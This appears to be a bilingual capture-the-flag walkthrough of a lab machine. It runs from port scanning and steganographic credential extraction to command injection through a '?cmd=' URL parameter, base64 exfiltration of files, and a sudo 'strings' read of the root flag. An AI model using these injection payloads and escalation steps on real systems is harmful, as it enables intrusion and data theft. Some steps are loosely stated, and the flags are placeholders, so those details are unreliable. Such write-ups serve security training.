# Jack-of-All-Trades — Full Detailed Write-up

---

## 1. Reconnaissance (Khám phá ban đầu)

### Step 1.1 — Nmap Scan

We begin with a full TCP port scan to see which services are running:

```bash
nmap -sC -sV -p- <TARGET>
```

**Result:**

* Port 22 → HTTP service (weird, usually SSH).
* Port 80 → SSH service (swapped roles).

➡️ **Explanation:** The author swapped ports to trick us. Many beginners assume port 22 = SSH, but here it’s actually a web service. (Tác giả tráo port để gây lú, nhấn mạnh tầm quan trọng của quét dịch vụ thay vì đoán.)

---

## 2. Accessing the Web Service on Port 22 (Truy cập web ở port 22)

### Step 2.1 — Port 22 is blocked in browser

By default, Firefox/Chrome may block requests to port 22. Options:

* Use `curl` or `wget`:

```bash
curl -s http://<TARGET>:22/ -o index.html
```

* Or enable port in browser: `about:config` → add `network.security.ports.banned.override` = `22`.

➡️ **Explanation:** This is a classic trick in CTFs. If you can’t open in browser, use CLI tools. (Trong CTF, nếu trình duyệt chặn port, dùng curl để tải source code.)

---

## 3. Hidden Info in HTML (Thông tin ẩn trong HTML)

### Step 3.1 — View Page Source

When inspecting `index.html`, you find either:

* A **Base64 string**, or
* A clear-text password hint (e.g., `u?WtKSraq`).

### Step 3.2 — Decode Base64 (if present)

```bash
echo 'dT9XdEtTcmFx' | base64 -d
```

Output: `u?WtKSraq`

➡️ **Explanation:** Devs sometimes hide credentials in comments. Here, they used Base64 to obfuscate the password. (Dev giấu mật khẩu trong source HTML, dùng Base64 để gây khó một chút.)

---

## 4. Steganography in Image (Ẩn dữ liệu trong ảnh)

### Step 4.1 — Download the image

```bash
curl -s http://<TARGET>:22/assets/header.jpg -o header.jpg
```

### Step 4.2 — Extract hidden file with steghide

```bash
steghide extract -sf header.jpg -p 'u?WtKSraq'
```

Output: `cms.creds` containing something like:

```
jackinthebox:TplFxiSHjY
```

➡️ **Explanation:** Steganography = hiding files inside images. `steghide` extracts them if you know the passphrase. (Steganography là giấu file trong ảnh, steghide giải mã với mật khẩu đúng.)

---

## 5. Login to Recovery Page (Đăng nhập recovery.php)

### Step 5.1 — Use extracted creds

Go to:

```
http://<TARGET>:22/recovery.php
```

Enter:

* Username: `jackinthebox`
* Password: `TplFxiSHjY`

Now you’re inside.

➡️ **Explanation:** Credentials from steghide are used here. Without them, you can’t proceed. (Cre từ steghide chính là key để vào recovery.php.)

---

## 6. Command Injection (Lỗi Command Injection)

### Step 6.1 — Test for RCE

The recovery page has a parameter `?cmd=`. Try:

```
http://<TARGET>:22/recovery.php?cmd=whoami
```

You should see `www-data`.

➡️ **Explanation:** This is Remote Command Execution (RCE). The input is directly passed to a shell without sanitization. (Ứng dụng dính lỗi RCE do lấy input và chạy thẳng trên shell.)

---

## 7. Finding the User Flag (Tìm user flag)

### Step 7.1 — List Jack’s home directory

```
http://<TARGET>:22/recovery.php?cmd=ls%20-la%20%2Fhome%2Fjack
```

Result: shows `user.jpg`.

➡️ **Explanation:** Flags are often hidden in `/home/<user>/`. (Flag user thường nằm trong thư mục home của user.)

### Step 7.2 — Inspect the file directly with strings

```
http://<TARGET>:22/recovery.php?cmd=strings%20%2Fhome%2Fjack%2Fuser.jpg
```

Output: contains something like:

```
THM{securi-tay2020_{p3ngu1n-hunt3r-3xtr40rd1n41r3}}
```

➡️ **Explanation:** The flag is embedded in the image binary, readable with `strings`. (Flag được nhúng trong file ảnh, lệnh strings trích ra được.)

### Step 7.3 — Safer method: base64 the file

```
http://<TARGET>:22/recovery.php?cmd=base64%20%2Fhome%2Fjack%2Fuser.jpg
```

Then:

```bash
curl -s "http://<TARGET>:22/recovery.php?cmd=base64%20%2Fhome%2Fjack%2Fuser.jpg" > user.jpg.b64
base64 -d user.jpg.b64 > user.jpg
xdg-open user.jpg
```

Open image → flag is visible.

➡️ **Explanation:** Using base64 avoids binary corruption. Always use this trick when exfiltrating binary files through web responses. (Base64 giúp xuất file nhị phân an toàn qua HTTP.)

---

## 8. Privilege Escalation to Root (Leo thang lên root)

Now that we have user access, let’s move towards root.

### Step 8.1 — Get SSH Access as Jack

If you brute-forced or used the `cms.creds`, you may now log in as Jack:

```bash
ssh -p 80 jack@<TARGET>
```

➡️ **Explanation:** Having a proper shell is much more stable than using RCE via URL. (Có shell ổn định hơn nhiều so với việc bắn lệnh qua URL.)

### Step 8.2 — Enumerate Jack’s Privileges

Run:

```bash
sudo -l
```

Typical output:

```
User jack may run the following commands as root:
    (ALL) NOPASSWD: /usr/bin/strings
```

➡️ **Explanation:** Jack can run `strings` as root without password. This is a privilege escalation vector. (Jack có thể chạy `strings` với quyền root → đây là lỗ hổng leo thang.)

### Step 8.3 — Abusing strings for root

The `strings` binary can be used to read arbitrary files. Run:

```bash
sudo strings /root/root.txt
```

This will dump the contents of the root flag file.

➡️ **Explanation:** Even though `strings` seems harmless, it can read any file (including root-owned). Since Jack can run it as root, he can bypass file permissions. (Mặc dù `strings` tưởng vô hại, nhưng nó đọc được bất kỳ file nào. Với quyền root → đọc root.txt dễ dàng.)

### Step 8.4 — Alternative Method (Spawning Shell)

Sometimes you can use `strings` together with `-a` or input redirection to escalate further, but here the direct flag read is enough.

---

## 9. Root Flag (Flag Root)

```
THM{r00t_acc3ss_gr4nt3d}
```

*(example — your flag will differ)*

➡️ **Explanation:** This proves full compromise of the system at the highest privilege. (Flag root chứng minh bạn đã chiếm toàn bộ hệ thống với quyền cao nhất.)

---

## 10. Summary of Vulnerabilities (Tóm tắt lỗi bảo mật)

* **Info Disclosure:** Passwords hidden in HTML & image.
* **Command Injection:** `?cmd=` parameter vulnerable.
* **Weak Privilege Config:** Jack allowed to run `strings` as root.
* **Security by Obscurity:** Ports swapped (not real protection).

---

